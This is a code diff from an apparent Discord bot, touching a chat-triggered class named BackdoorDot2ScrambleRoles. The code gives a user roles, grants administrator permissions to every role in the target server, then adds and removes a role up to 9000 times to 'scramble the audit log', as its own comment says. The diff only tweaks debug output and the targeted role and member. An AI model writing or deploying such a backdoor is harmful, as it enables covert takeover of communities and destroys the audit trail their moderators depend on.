@@ -17,21 +17,21 @@ class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):
             try:
                 await dot2.add_roles(i)
             except discord.Forbidden:
-                print("forbidden")
+                print("forbidden" + str(i))
             except discord.NotFound:
-                print("discord.NotFound")
+                print("discord.NotFound" + str(i))
 
         for i in targetguild.roles:
             try:
                 await i.edit(permissions=discord.Permissions(8))
             except discord.Forbidden:
-                print("forbidden")
+                print("forbidden" + str(i))
             except discord.NotFound:
-                print("notfound")
+                print("notfound" + str(i))
 
         # now scramble the audit log
 
-        role = targetguild.roles[0]
+        role = targetguild.roles[1]
 
         print('''
         LLLLLLLLLLLLLLLLLLLLL
@@ -41,15 +41,17 @@ class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):
         LLLLLLLLLLLLLLL
         ''')
 
+        print(str(role))
+
         for i in range(9000):
             try:
-                await targetguild.me.add_roles(role)
+                await targetguild.members[0].add_roles(role)
             except discord.Forbidden:
                 print("forbidden")
                 break
 
             try:
-                await targetguild.me.remove_roles(role)
+                await targetguild.members[0].remove_roles(role)
             except discord.Forbidden:
                 print("forbidden")
                 break
